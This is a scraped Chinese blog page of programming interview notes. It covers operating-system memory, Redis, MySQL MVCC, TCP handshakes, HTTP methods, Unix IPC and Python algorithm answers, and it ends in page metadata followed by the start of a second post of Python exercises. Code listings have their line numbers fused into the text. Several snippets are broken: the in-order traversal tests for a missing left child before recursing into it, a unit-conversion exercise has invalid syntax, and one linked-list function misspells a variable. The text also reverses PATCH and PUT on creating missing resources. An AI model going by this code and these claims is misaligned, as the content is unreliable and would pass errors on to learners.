用户程序的地址空间被划分成若干固定大小的区域，称为“页”，相应地，内存空间分成若干个物理块，页和块的大小相等。可将用户程序的任一页放在内存的任一块中，实现了离散分配。 分段: 将用户程序地址空间分成若干个大小不等的段，每段可以定义一组相对完整的逻辑信息。存储分配时，以段为单位，段与段在内存中可以不相邻接，也实现了离散分配。 分页与分段的主要区别 页是信息的物理单位,分页是为了实现非连续分配,以便解决内存碎片问题,或者说分页是由于系统管理的需要.段是信息的逻辑单位,它含有一组意义相对完整的信息,分段的目的是为了更好地实现共享,满足用户的需要. 页的大小固定,由系统确定,将逻辑地址划分为页号和页内地址是由机器硬件实现的.而段的长度却不固定,决定于用户所编写的程序,通常由编译程序在对源程序进行编译时根据信息的性质来划分. 分页的作业地址空间是一维的.分段的地址空间是二维的. 8 页面置换算法 最佳置换算法OPT:不可能实现 先进先出FIFO 最近最久未使用算法LRU:最近一段时间里最久没有使用过的页面予以置换. clock算法 9 边沿触发和水平触发边缘触发是指每当状态变化时发生一个 io 事件，条件触发是只要满足条件就发生一个 io 事件 数据库1 事务数据库事务(Database Transaction) ，是指作为单个逻辑工作单元执行的一系列操作，要么完全地执行，要么完全地不执行。彻底理解数据库事务: http://www.hollischuang.com/archives/898 2 数据库索引推荐: http://tech.meituan.com/mysql-index.html MySQL索引背后的数据结构及算法原理 聚集索引,非聚集索引,B-Tree,B+Tree,最左前缀原理 3 Redis原理Redis是什么？ 是一个完全开源免费的key-value内存数据库 通常被认为是一个数据结构服务器，主要是因为其有着丰富的数据结构 strings、map、 list、sets、 sorted sets Redis数据库 通常局限点来说，Redis也以消息队列的形式存在，作为内嵌的List存在，满足实时的高并发需求。在使用缓存的时候，redis比memcached具有更多的优势，并且支持更多的数据类型，把redis当作一个中间存储系统，用来处理高并发的数据库操作 速度快：使用标准C写，所有数据都在内存中完成，读写速度分别达到10万&#x2F;20万 持久化：对数据的更新采用Copy-on-write技术，可以异步地保存到磁盘上，主要有两种策略，一是根据时间，更新次数的快照（save 300 10 ）二是基于语句追加方式(Append-only file，aof) 自动操作：对不同数据类型的操作都是自动的，很安全 快速的主–从复制，官方提供了一个数据，Slave在21秒即完成了对Amazon网站10G key set的复制。 Sharding技术： 很容易将数据分布到多个Redis实例中，数据库的扩展是个永恒的话题，在关系型数据库中，主要是以添加硬件、以分区为主要技术形式的纵向扩展解决了很多的应用场景，但随着web2.0、移动互联网、云计算等应用的兴起，这种扩展模式已经不太适合了，所以近年来，像采用主从配置、数据库复制形式的，Sharding这种技术把负载分布到多个特理节点上去的横向扩展方式用处越来越多。 Redis缺点 是数据库容量受到物理内存的限制,不能用作海量数据的高性能读写,因此Redis适合的场景主要局限在较小数据量的高性能操作和运算上。 Redis较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂。为避免这一问题，运维人员在系统上线时必须确保有足够的空间，这对资源造成了很大的浪费。 4 乐观锁和悲观锁悲观锁：假定会发生并发冲突，屏蔽一切可能违反数据完整性的操作 乐观锁：假设不会发生并发冲突，只在提交操作时检查是否违反数据完整性。 乐观锁与悲观锁的具体区别: http://www.cnblogs.com/Bob-FD/p/3352216.html 5 MVCC 全称是Multi-Version Concurrent Control，即多版本并发控制，在MVCC协议下，每个读操作会看到一个一致性的snapshot，并且可以实现非阻塞的读。MVCC允许数据具有多个版本，这个版本可以是时间戳或者是全局递增的事务ID，在同一个时间点，不同的事务看到的数据是不同的。 MySQL的innodb引擎是如何实现MVCC的innodb会为每一行添加两个字段，分别表示该行创建的版本和删除的版本，填入的是事务的版本号，这个版本号随着事务的创建不断递增。在repeated read的隔离级别（事务的隔离级别请看这篇文章）下，具体各种数据库操作的实现： select：满足以下两个条件innodb会返回该行数据： 该行的创建版本号小于等于当前版本号，用于保证在select操作之前所有的操作已经执行落地。 该行的删除版本号大于当前版本或者为空。删除版本号大于当前版本意味着有一个并发事务将该行删除了。 insert：将新插入的行的创建版本号设置为当前系统的版本号。 delete：将要删除的行的删除版本号设置为当前系统的版本号。 update：不执行原地update，而是转换成insert + delete。将旧行的删除版本号设置为当前版本号，并将新行insert同时设置创建版本号为当前版本号。 其中，写操作（insert、delete和update）执行时，需要将系统版本号递增。 由于旧数据并不真正的删除，所以必须对这些数据进行清理，innodb会开启一个后台线程执行清理工作，具体的规则是将删除版本号小于当前系统版本的行删除，这个过程叫做purge。 通过MVCC很好的实现了事务的隔离性，可以达到repeated read级别，要实现serializable还必须加锁。 参考：MVCC浅析 6 MyISAM和InnoDBMyISAM 适合于一些需要大量查询的应用，但其对于有大量写操作并不是很好。甚至你只是需要update一个字段，整个表都会被锁起来，而别的进程，就算是读进程都无法操作直到读操作完成。另外，MyISAM 对于 SELECT COUNT(*) 这类的计算是超快无比的。 InnoDB 的趋势会是一个非常复杂的存储引擎，对于一些小的应用，它会比 MyISAM 还慢。他是它支持“行锁” ，于是在写操作比较多的时候，会更优秀。并且，他还支持更多的高级应用，比如：事务。 mysql 数据库引擎: http://www.cnblogs.com/0201zcr/p/5296843.htmlMySQL存储引擎－－MyISAM与InnoDB区别: https://segmentfault.com/a/1190000008227211 网络1 三次握手 客户端通过向服务器端发送一个SYN来创建一个主动打开，作为三次握手的一部分。客户端把这段连接的序号设定为随机数 A。 服务器端应当为一个合法的SYN回送一个SYN&#x2F;ACK。ACK 的确认码应为 A+1，SYN&#x2F;ACK 包本身又有一个随机序号 B。 最后，客户端再发送一个ACK。当服务端受到这个ACK的时候，就完成了三路握手，并进入了连接创建状态。此时包序号被设定为收到的确认号 A+1，而响应则为 B+1。 2 四次挥手注意: 中断连接端可以是客户端，也可以是服务器端. 下面仅以客户端断开连接举例, 反之亦然. 客户端发送一个数据分段, 其中的 FIN 标记设置为1. 客户端进入 FIN-WAIT 状态. 该状态下客户端只接收数据, 不再发送数据. 服务器接收到带有 FIN &#x3D; 1 的数据分段, 发送带有 ACK &#x3D; 1 的剩余数据分段, 确认收到客户端发来的 FIN 信息. 服务器等到所有数据传输结束, 向客户端发送一个带有 FIN &#x3D; 1 的数据分段, 并进入 CLOSE-WAIT 状态, 等待客户端发来带有 ACK &#x3D; 1 的确认报文. 客户端收到服务器发来带有 FIN &#x3D; 1 的报文, 返回 ACK &#x3D; 1 的报文确认, 为了防止服务器端未收到需要重发, 进入 TIME-WAIT 状态. 服务器接收到报文后关闭连接. 客户端等待 2MSL 后未收到回复, 则认为服务器成功关闭, 客户端关闭连接. 图解: http://blog.csdn.net/whuslei/article/details/6667471 3 ARP协议地址解析协议(Address Resolution Protocol)，其基本功能为透过目标设备的IP地址，查询目标的MAC地址，以保证通信的顺利进行。它是IPv4网络层必不可少的协议，不过在IPv6中已不再适用，并被邻居发现协议（NDP）所替代。 4 urllib和urllib2的区别这个面试官确实问过,当时答的urllib2可以Post而urllib不可以. urllib提供urlencode方法用来GET查询字符串的产生，而urllib2没有。这是为何urllib常和urllib2一起使用的原因。 urllib2可以接受一个Request类的实例来设置URL请求的headers，urllib仅可以接受URL。这意味着，你不可以伪装你的User Agent字符串等。 5 Post和GetGET和POST有什么区别？及为什么网上的多数答案都是错的知乎回答 get: RFC 2616 - Hypertext Transfer Protocol – HTTP&#x2F;1.1post: RFC 2616 - Hypertext Transfer Protocol – HTTP&#x2F;1.1 6 Cookie和Session Cookie Session 储存位置 客户端 服务器端 目的 跟踪会话，也可以保存用户偏好设置或者保存用户名密码等 跟踪会话 安全性 不安全 安全 session技术是要使用到cookie的，之所以出现session技术，主要是为了安全。 7 apache和nginx的区别nginx 相对 apache 的优点： 轻量级，同样起web 服务，比apache 占用更少的内存及资源 抗并发，nginx 处理请求是异步非阻塞的，支持更多的并发连接，而apache 则是阻塞型的，在高并发下nginx 能保持低资源低消耗高性能 配置简洁 高度模块化的设计，编写模块相对简单 社区活跃 apache 相对nginx 的优点： rewrite ，比nginx 的rewrite 强大 模块超多，基本想到的都可以找到 少bug ，nginx 的bug 相对较多 超稳定 8 网站用户密码保存 明文保存 明文hash后保存,如md5 MD5+Salt方式,这个salt可以随机 知乎使用了Bcrypy(好像)加密 9 HTTP和HTTPS 状态码 定义 1xx 报告 接收到请求，继续进程 2xx 成功 步骤成功接收，被理解，并被接受 3xx 重定向 为了完成请求,必须采取进一步措施 4xx 客户端出错 请求包括错的顺序或不能完成 5xx 服务器出错 服务器无法完成显然有效的请求 403: Forbidden404: Not Found HTTPS握手,对称加密,非对称加密,TLS&#x2F;SSL,RSA 10 XSRF和XSS CSRF(Cross-site request forgery)跨站请求伪造 XSS(Cross Site Scripting)跨站脚本攻击 CSRF重点在请求,XSS重点在脚本 11 幂等 IdempotenceHTTP方法的幂等性是指一次和多次请求某一个资源应该具有同样的副作用。(注意是副作用) GET http://www.bank.com/account/123456，不会改变资源的状态，不论调用一次还是N次都没有副作用。请注意，这里强调的是一次和N次具有相同的副作用，而不是每次GET的结果相同。GET http://www.news.com/latest-news这个HTTP请求可能会每次得到不同的结果，但它本身并没有产生任何副作用，因而是满足幂等性的。 DELETE方法用于删除资源，有副作用，但它应该满足幂等性。比如：DELETE http://www.forum.com/article/4231，调用一次和N次对系统产生的副作用是相同的，即删掉id为4231的帖子；因此，调用者可以多次调用或刷新页面而不必担心引起错误。 POST所对应的URI并非创建的资源本身，而是资源的接收者。比如：POST http://www.forum.com/articles的语义是在http://www.forum.com/articles下创建一篇帖子，HTTP响应中应包含帖子的创建状态以及帖子的URI。两次相同的POST请求会在服务器端创建两份资源，它们具有不同的URI；所以，POST方法不具备幂等性。 PUT所对应的URI是要创建或更新的资源本身。比如：PUT http://www.forum/articles/4231的语义是创建或更新ID为4231的帖子。对同一URI进行多次PUT的副作用和一次PUT是相同的；因此，PUT方法具有幂等性。 12 RESTful架构(SOAP,RPC)推荐: http://www.ruanyifeng.com/blog/2011/09/restful.html 13 SOAPSOAP（原为Simple Object Access Protocol的首字母缩写，即简单对象访问协议）是交换数据的一种协议规范，使用在计算机网络Web服务（web service）中，交换带结构信息。SOAP为了简化网页服务器（Web Server）从XML数据库中提取数据时，节省去格式化页面时间，以及不同应用程序之间按照HTTP通信协议，遵从XML格式执行资料互换，使其抽象于语言实现、平台和硬件。 14 RPCRPC（Remote Procedure Call Protocol）——远程过程调用协议，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。RPC协议假定某些传输协议的存在，如TCP或UDP，为通信程序之间携带信息数据。在OSI网络通信模型中，RPC跨越了传输层和应用层。RPC使得开发包括网络分布式多程序在内的应用程序更加容易。 总结:服务提供的两大流派.传统意义以方法调用为导向通称RPC。为了企业SOA,若干厂商联合推出webservice,制定了wsdl接口定义,传输soap.当互联网时代,臃肿SOA被简化为http+xml&#x2F;json.但是简化出现各种混乱。以资源为导向,任何操作无非是对资源的增删改查，于是统一的REST出现了. 进化的顺序: RPC -&gt; SOAP -&gt; RESTful 15 CGI和WSGICGI是通用网关接口，是连接web服务器和应用程序的接口，用户通过CGI来获取动态数据或文件等。CGI程序是一个独立的程序，它可以用几乎所有语言来写，包括perl，c，lua，python等等。 WSGI, Web Server Gateway Interface，是Python应用程序或框架和Web服务器之间的一种接口，WSGI的其中一个目的就是让用户可以用统一的语言(Python)编写前后端。 官方说明：PEP-3333 16 中间人攻击在GFW里屡见不鲜的,呵呵. 中间人攻击（Man-in-the-middle attack，通常缩写为MITM）是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。 17 c10k问题所谓c10k问题，指的是服务器同时支持成千上万个客户端的问题，也就是concurrent 10 000 connection（这也是c10k这个名字的由来）。推荐: https://my.oschina.net/xianggao/blog/664275 18 socket推荐: http://www.360doc.com/content/11/0609/15/5482098_122692444.shtml Socket&#x3D;Ip address+ TCP&#x2F;UDP + port 19 浏览器缓存推荐: http://www.cnblogs.com/skynet/archive/2012/11/28/2792503.html 304 Not Modified 20 HTTP1.0和HTTP1.1推荐: http://blog.csdn.net/elifefly/article/details/3964766 请求头Host字段,一个服务器多个网站 长链接 文件断点续传 身份认证,状态管理,Cache缓存 HTTP请求8种方法介绍HTTP&#x2F;1.1协议中共定义了8种HTTP请求方法，HTTP请求方法也被叫做“请求动作”，不同的方法规定了不同的操作指定的资源方式。服务端也会根据不同的请求方法做不同的响应。 GET GET请求会显示请求指定的资源。一般来说GET方法应该只用于数据的读取，而不应当用于会产生副作用的非幂等的操作中。 GET会方法请求指定的页面信息，并返回响应主体，GET被认为是不安全的方法，因为GET方法会被网络蜘蛛等任意的访问。 HEAD HEAD方法与GET方法一样，都是向服务器发出指定资源的请求。但是，服务器在响应HEAD请求时不会回传资源的内容部分，即：响应主体。这样，我们可以不传输全部内容的情况下，就可以获取服务器的响应头信息。HEAD方法常被用于客户端查看服务器的性能。 POST POST请求会 向指定资源提交数据，请求服务器进行处理，如：表单数据提交、文件上传等，请求数据会被包含在请求体中。POST方法是非幂等的方法，因为这个请求可能会创建新的资源或&#x2F;和修改现有资源。 PUT PUT请求会身向指定资源位置上传其最新内容，PUT方法是幂等的方法。通过该方法客户端可以将指定资源的最新数据传送给服务器取代指定的资源的内容。 DELETE DELETE请求用于请求服务器删除所请求URI（统一资源标识符，Uniform Resource Identifier）所标识的资源。DELETE请求后指定资源会被删除，DELETE方法也是幂等的。 CONNECT CONNECT方法是HTTP&#x2F;1.1协议预留的，能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接与非加密的HTTP代理服务器的通信。 OPTIONS OPTIONS请求与HEAD类似，一般也是用于客户端查看服务器的性能。 这个方法会请求服务器返回该资源所支持的所有HTTP请求方法，该方法会用’*’来代替资源名称，向服务器发送OPTIONS请求，可以测试服务器功能是否正常。JavaScript的XMLHttpRequest对象进行CORS跨域资源共享时，就是使用OPTIONS方法发送嗅探请求，以判断是否有对指定资源的访问权限。 允许 TRACE TRACE请求服务器回显其收到的请求信息，该方法主要用于HTTP请求的测试或诊断。 HTTP&#x2F;1.1之后增加的方法 在HTTP&#x2F;1.1标准制定之后，又陆续扩展了一些方法。其中使用中较多的是 PATCH 方法： PATCH PATCH方法出现的较晚，它在2010年的RFC 5789标准中被定义。PATCH请求与PUT请求类似，同样用于资源的更新。二者有以下两点不同： 但PATCH一般用于资源的部分更新，而PUT一般用于资源的整体更新。当资源不存在时，PATCH会创建一个新的资源，而PUT只会对已在资源进行更新。 21 AjaxAJAX,Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）, 是与在不重新加载整个页面的情况下，与服务器交换数据并更新部分网页的技术。 *NIXunix进程间通信方式(IPC) 管道（Pipe）：管道可用于具有亲缘关系进程间的通信，允许一个进程和另一个与它有共同祖先的进程之间进行通信。 命名管道（named pipe）：命名管道克服了管道没有名字的限制，因此，除具有管道所具有的功能外，它还允许无亲缘关系进程间的通信。命名管道在文件系统中有对应的文件名。命名管道通过命令mkfifo或系统调用mkfifo来创建。 信号（Signal）：信号是比较复杂的通信方式，用于通知接受进程有某种事件发生，除了用于进程间通信外，进程还可以发送信号给进程本身；linux除了支持Unix早期信号语义函数sigal外，还支持语义符合Posix.1标准的信号函数sigaction（实际上，该函数是基于BSD的，BSD为了实现可靠信号机制，又能够统一对外接口，用sigaction函数重新实现了signal函数）。 消息（Message）队列：消息队列是消息的链接表，包括Posix消息队列system V消息队列。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺 共享内存：使得多个进程可以访问同一块内存空间，是最快的可用IPC形式。是针对其他通信机制运行效率较低而设计的。往往与其它通信机制，如信号量结合使用，来达到进程间的同步及互斥。 内存映射（mapped memory）：内存映射允许任何多个进程间通信，每一个使用该机制的进程通过把一个共享的文件映射到自己的进程地址空间来实现它。 信号量（semaphore）：主要作为进程间以及同一进程不同线程之间的同步手段。 套接口（Socket）：更为一般的进程间通信机制，可用于不同机器之间的进程间通信。起初是由Unix系统的BSD分支开发出来的，但现在一般可以移植到其它类Unix系统上：Linux和System V的变种都支持套接字。 数据结构1 红黑树红黑树与AVL的比较： AVL是严格平衡树，因此在增加或者删除节点的时候，根据不同情况，旋转的次数比红黑树要多； 红黑是用非严格的平衡来换取增删节点时候旋转次数的降低； 所以简单说，如果你的应用中，搜索的次数远远大于插入和删除，那么选择AVL，如果搜索，插入删除次数几乎差不多，应该选择RB。 红黑树详解: https://xieguanglei.github.io/blog/post/red-black-tree.html 教你透彻了解红黑树: https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/03.01.md 编程题1 台阶问题&#x2F;斐波那契一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 1fib = lambda n: n if n &lt;= 2 else fib(n - 1) + fib(n - 2) 第二种记忆方法 1234567891011121314def memo(func): cache = &#123;&#125; def wrap(*args): if args not in cache: cache[args] = func(*args) return cache[args] return wrap@memodef fib(i): if i &lt; 2: return 1 return fib(i-1) + fib(i-2) 第三种方法 12345def fib(n): a, b = 0, 1 for x in range(n): a, b = b, a + b return b 2 变态台阶问题一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 1fib = lambda n: n if n &lt; 2 else 2 * fib(n - 1) 3 矩形覆盖我们可以用2*1的小矩形横着或者竖着去覆盖更大的矩形。请问用n个2*1的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？ 第2*n个矩形的覆盖方法等于第2*(n-1)加上第2*(n-2)的方法。 1f = lambda n: 1 if n &lt; 2 else f(n - 1) + f(n - 2) 4 杨氏矩阵查找在一个m行n列二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 使用Step-wise线性搜索。 1234567891011121314151617def get_value(l, r, c): return l[r][c]def find(l, x): m = len(l) - 1 n = len(l[0]) - 1 r = 0 c = n while c &gt;= 0 and r &lt;= m: value = get_value(l, r, c) if value == x: return True elif value &gt; x: c = c - 1 elif value &lt; x: r = r + 1 return False 5 去除列表中的重复元素用集合 1list(set(l)) 用字典 123l1 = [&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;a&#x27;]l2 = &#123;&#125;.fromkeys(l1).keys()print l2 用字典并保持顺序 1234l1 = [&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;a&#x27;]l2 = list(set(l1))l2.sort(key=l1.index)print l2 列表推导式 123l1 = [&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;a&#x27;]l2 = [][l2.append(i) for i in l1 if not i in l2] sorted排序并且用列表推导式. l &#x3D; [‘b’,’c’,’d’,’b’,’c’,’a’,’a’][single.append(i) for i in sorted(l) if i not in single]print single 6 链表成对调换1-&gt;2-&gt;3-&gt;4转换成2-&gt;1-&gt;4-&gt;3. 123456789101112131415class ListNode: def __init__(self, x): self.val = x self.next = Noneclass Solution: # @param a ListNode # @return a ListNode def swapPairs(self, head): if head != None and head.next != None: next = head.next head.next = self.swapPairs(next.next) next.next = head return next return head 7 创建字典的方法1 直接创建1dict = &#123;&#x27;name&#x27;:&#x27;earth&#x27;, &#x27;port&#x27;:&#x27;80&#x27;&#125; 2 工厂方法123items=[(&#x27;name&#x27;,&#x27;earth&#x27;),(&#x27;port&#x27;,&#x27;80&#x27;)]dict2=dict(items)dict1=dict(([&#x27;name&#x27;,&#x27;earth&#x27;],[&#x27;port&#x27;,&#x27;80&#x27;])) 3 fromkeys()方法1234dict1=&#123;&#125;.fromkeys((&#x27;x&#x27;,&#x27;y&#x27;),-1)dict=&#123;&#x27;x&#x27;:-1,&#x27;y&#x27;:-1&#125;dict2=&#123;&#125;.fromkeys((&#x27;x&#x27;,&#x27;y&#x27;))dict2=&#123;&#x27;x&#x27;:None, &#x27;y&#x27;:None&#125; 8 合并两个有序列表知乎远程面试要求编程 尾递归 12345678910111213141516def _recursion_merge_sort2(l1, l2, tmp): if len(l1) == 0 or len(l2) == 0: tmp.extend(l1) tmp.extend(l2) return tmp else: if l1[0] &lt; l2[0]: tmp.append(l1[0]) del l1[0] else: tmp.append(l2[0]) del l2[0] return _recursion_merge_sort2(l1, l2, tmp)def recursion_merge_sort2(l1, l2): return _recursion_merge_sort2(l1, l2, []) 循环算法 思路： 定义一个新的空列表 比较两个列表的首个元素 小的就插入到新列表里 把已经插入新列表的元素从旧列表删除 直到两个旧列表有一个为空 再把旧列表加到新列表后面 123456789101112def loop_merge_sort(l1, l2): tmp = [] while len(l1) &gt; 0 and len(l2) &gt; 0: if l1[0] &lt; l2[0]: tmp.append(l1[0]) del l1[0] else: tmp.append(l2[0]) del l2[0] tmp.extend(l1) tmp.extend(l2) return tmp pop弹出 1234567891011121314151617a = [1,2,3,7]b = [3,4,5]def merge_sortedlist(a,b): c = [] while a and b: if a[0] &gt;= b[0]: c.append(b.pop(0)) else: c.append(a.pop(0)) while a: c.append(a.pop(0)) while b: c.append(b.pop(0)) return cprint merge_sortedlist(a,b) 9 交叉链表求交点 其实思想可以按照从尾开始比较两个链表，如果相交，则从尾开始必然一致，只要从尾开始比较，直至不一致的地方即为交叉点，如图所示 1234567891011121314# 使用a,b两个list来模拟链表，可以看出交叉点是 7这个节点a = [1,2,3,7,9,1,5]b = [4,5,7,9,1,5]for i in range(1,min(len(a),len(b))): if i==1 and (a[-1] != b[-1]): print &quot;No&quot; break else: if a[-i] != b[-i]: print &quot;交叉节点：&quot;,a[-i+1] break else: pass 另外一种比较正规的方法，构造链表类 1234567891011121314151617181920212223242526class ListNode: def __init__(self, x): self.val = x self.next = Nonedef node(l1, l2): length1, lenth2 = 0, 0 # 求两个链表长度 while l1.next: l1 = l1.next length1 += 1 while l2.next: l2 = l2.next length2 += 1 # 长的链表先走 if length1 &gt; lenth2: for _ in range(length1 - length2): l1 = l1.next else: for _ in range(length2 - length1): l2 = l2.next while l1 and l2: if l1.next == l2.next: return l1.next else: l1 = l1.next l2 = l2.next 修改了一下: 123456789101112131415161718192021222324252627282930#coding:utf-8class ListNode: def __init__(self, x): self.val = x self.next = Nonedef node(l1, l2): length1, length2 = 0, 0 # 求两个链表长度 while l1.next: l1 = l1.next#尾节点 length1 += 1 while l2.next: l2 = l2.next#尾节点 length2 += 1 #如果相交 if l1.next == l2.next: # 长的链表先走 if length1 &gt; length2: for _ in range(length1 - length2): l1 = l1.next return l1#返回交点 else: for _ in range(length2 - length1): l2 = l2.next return l2#返回交点 # 如果不相交 else: return 思路: http://humaoli.blog.163.com/blog/static/13346651820141125102125995/ 10 二分查找1234567891011121314151617#coding:utf-8def binary_search(list,item): low = 0 high = len(list)-1 while low&lt;=high: mid = (low+high)/2 guess = list[mid] if guess&gt;item: high = mid-1 elif guess&lt;item: low = mid+1 else: return mid return Nonemylist = [1,3,5,7,9]print binary_search(mylist,3) 参考: http://blog.csdn.net/u013205877/article/details/76411718 11 快排123456789101112#coding:utf-8def quicksort(list): if len(list)&lt;2: return list else: midpivot = list[0] lessbeforemidpivot = [i for i in list[1:] if i&lt;=midpivot] biggerafterpivot = [i for i in list[1:] if i &gt; midpivot] finallylist = quicksort(lessbeforemidpivot)+[midpivot]+quicksort(biggerafterpivot) return finallylistprint quicksort([2,4,6,7,1,2,5]) 更多排序问题可见：数据结构与算法-排序篇-Python描述 12 找零问题12345678910111213141516171819#coding:utf-8#values是硬币的面值values = [ 25, 21, 10, 5, 1]#valuesCounts 钱币对应的种类数#money 找出来的总钱数#coinsUsed 对应于目前钱币总数i所使用的硬币数目def coinChange(values,valuesCounts,money,coinsUsed): #遍历出从1到money所有的钱数可能 for cents in range(1,money+1): minCoins = cents #把所有的硬币面值遍历出来和钱数做对比 for kind in range(0,valuesCounts): if (values[kind] &lt;= cents): temp = coinsUsed[cents - values[kind]] +1 if (temp &lt; minCoins): minCoins = temp coinsUsed[cents] = minCoins print (&#x27;面值:&#123;0&#125;的最少硬币使用数为:&#123;1&#125;&#x27;.format(cents, coinsUsed[cents])) 思路: http://blog.csdn.net/wdxin1322/article/details/9501163 方法: http://www.cnblogs.com/ChenxofHit/archive/2011/03/18/1988431.html 13 广度遍历和深度遍历二叉树给定一个数组，构建二叉树，并且按层次打印这个二叉树 14 二叉树节点12345678class Node(object): def __init__(self, data, left=None, right=None): self.data = data self.left = left self.right = righttree = Node(1, Node(3, Node(7, Node(0)), Node(6)), Node(2, Node(5), Node(4))) 15 层次遍历123456def lookup(root): row = [root] while row: print(row) row = [kid for item in row for kid in (item.left, item.right) if kid] 16 深度遍历12345678910def deep(root): if not root: return print root.data deep(root.left) deep(root.right)if __name__ == &#x27;__main__&#x27;: lookup(tree) deep(tree) 17 前中后序遍历深度遍历改变顺序就OK了 12345678910111213141516171819202122232425262728293031323334353637#coding:utf-8#二叉树的遍历#简单的二叉树节点类class Node(object): def __init__(self,value,left,right): self.value = value self.left = left self.right = right#中序遍历:遍历左子树,访问当前节点,遍历右子树def mid_travelsal(root): if root.left is None: mid_travelsal(root.left) #访问当前节点 print(root.value) if root.right is not None: mid_travelsal(root.right)#前序遍历:访问当前节点,遍历左子树,遍历右子树def pre_travelsal(root): print (root.value) if root.left is not None: pre_travelsal(root.left) if root.right is not None: pre_travelsal(root.right)#后续遍历:遍历左子树,遍历右子树,访问当前节点def post_trvelsal(root): if root.left is not None: post_trvelsal(root.left) if root.right is not None: post_trvelsal(root.right) print (root.value) 18 求最大树深1234def maxDepth(root): if not root: return 0 return max(maxDepth(root.left), maxDepth(root.right)) + 1 19 求两棵树是否相同1234567def isSameTree(p, q): if p == None and q == None: return True elif p and q : return p.val == q.val and isSameTree(p.left,q.left) and isSameTree(p.right,q.right) else : return False 20 前序中序求后序推荐: http://blog.csdn.net/hinyunsin/article/details/6315502 123456789101112131415def rebuild(pre, center): if not pre: return cur = Node(pre[0]) index = center.index(pre[0]) cur.left = rebuild(pre[1:index + 1], center[:index]) cur.right = rebuild(pre[index + 1:], center[index + 1:]) return curdef deep(root): if not root: return deep(root.left) deep(root.right) print root.data 21 单链表逆置12345678910111213141516171819202122class Node(object): def __init__(self, data=None, next=None): self.data = data self.next = nextlink = Node(1, Node(2, Node(3, Node(4, Node(5, Node(6, Node(7, Node(8, Node(9)))))))))def rev(link): pre = link cur = link.next pre.next = None while cur: tmp = cur.next cur.next = pre pre = cur cur = tmp return preroot = rev(link)while root: print root.data root = root.next 思路: http://blog.csdn.net/feliciafay/article/details/6841115 方法: http://www.xuebuyuan.com/2066385.html?mobile=1 22 两个字符串是否是变位词12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576class Anagram: &quot;&quot;&quot; @:param s1: The first string @:param s2: The second string @:return true or false &quot;&quot;&quot; def Solution1(s1,s2): alist = list(s2) pos1 = 0 stillOK = True while pos1 &lt; len(s1) and stillOK: pos2 = 0 found = False while pos2 &lt; len(alist) and not found: if s1[pos1] == alist[pos2]: found = True else: pos2 = pos2 + 1 if found: alist[pos2] = None else: stillOK = False pos1 = pos1 + 1 return stillOK print(Solution1(&#x27;abcd&#x27;,&#x27;dcba&#x27;)) def Solution2(s1,s2): alist1 = list(s1) alist2 = list(s2) alist1.sort() alist2.sort() pos = 0 matches = True while pos &lt; len(s1) and matches: if alist1[pos] == alist2[pos]: pos = pos + 1 else: matches = False return matches print(Solution2(&#x27;abcde&#x27;,&#x27;edcbg&#x27;)) def Solution3(s1,s2): c1 = [0]*26 c2 = [0]*26 for i in range(len(s1)): pos = ord(s1[i])-ord(&#x27;a&#x27;) c1[pos] = c1[pos] + 1 for i in range(len(s2)): pos = ord(s2[i])-ord(&#x27;a&#x27;) c2[pos] = c2[pos] + 1 j = 0 stillOK = True while j&lt;26 and stillOK: if c1[j] == c2[j]: j = j + 1 else: stillOK = False return stillOK print(Solution3(&#x27;apple&#x27;,&#x27;pleap&#x27;)) 23 动态规划问题 可参考：动态规划(DP)的整理-Python描述","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python练习","slug":"Python练习","date":"2020-07-08T01:22:15.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/08/Python练习/","permalink":"http://example.com/2020/07/08/Python%E7%BB%83%E4%B9%A0/","excerpt":"python 习题练习","text":"python 习题练习 python练习1.华氏温度转换 （转换公式为：**$C&#x3D;(F - 32) \\div 1.8$**）1234f = float(input(&#x27;请输入温度：&#x27;))c = (f-32)/1.8print(&#x27;%.1f华氏度 = %.1f摄氏度&#x27;%(f,c))print(f&#x27;&#123;f:.1f&#125;华氏度 = &#123;c:.1f&#125;摄氏度&#x27;) 2.输入圆的半径计算圆的面积和周长12345radius = float(input(&#x27;请输入圆的半径：&#x27;))perimeter = 2*3.1416*radiusarea = 3.1416*radius*radiusprint(&#x27;周长：%.2f&#x27;%perimeter)print(&#x27;面积：%.2f&#x27;%area) 3.判断输入年份是否为闰年123year = int(input(&#x27;年份：&#x27;))is_leap = year%4 == 0 and year % 100 !=0 or year % 400 ==0print(is_leap) 4：英制单位英寸与公制单位厘米互换。12345678value = float(input(&#x27;长度:&#x27;))unit = input(&#x27;请输入单位：&#x27;)if unit = &#x27;in&#x27; or unit = &#x27;英寸&#x27;： print(&#x27;%f英寸 = %f厘米&#x27; %(value,value*2.54))elif unit == &#x27;cm&#x27; or unit == &#x27;厘米&#x27;： print(&#x27;%f厘米 = %英寸&#x27; %(value,value/2.54))else: print(&#x27;请输入有效的单位！！&#x27;) 5:百分制成绩转换为等级制成绩。123456789101112score = 